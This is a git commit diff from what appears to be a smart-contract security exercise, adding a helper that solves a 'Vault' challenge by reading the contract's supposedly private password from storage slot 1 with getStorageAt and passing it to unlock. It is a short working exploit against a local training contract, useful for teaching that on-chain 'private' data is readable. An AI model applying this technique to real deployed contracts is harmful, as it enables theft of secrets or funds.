c83e7c73bd23fb5f8fb73cd54ac369c62c7a6441
speggos <spencercox@hotmail.com>
2022-04-04 11:31:56 -0700

    Vault hack

--- contracts/4. Vault/VaultHelper.ts
+++ contracts/4. Vault/VaultHelper.ts
@@ -2,12 +2,13 @@ import { expect } from "chai";
 import { ethers, waffle } from "hardhat";
 
 const helper = async (victim: any) => {
-  /* 
-    Add code here that will help you pass the test
-    Note: Unlock without using the string "A very strong password"
-    Unlock the vault by somehow reading the private password from 
-    Vault directly
-  */
+
+  const storageIndex = 0;
+
+  const provider = ethers.getDefaultProvider("http://localhost:8545");
+  const password = await provider.getStorageAt(victim.address,1);
+  await victim.unlock(password);
+
 };
 
 export default helper;
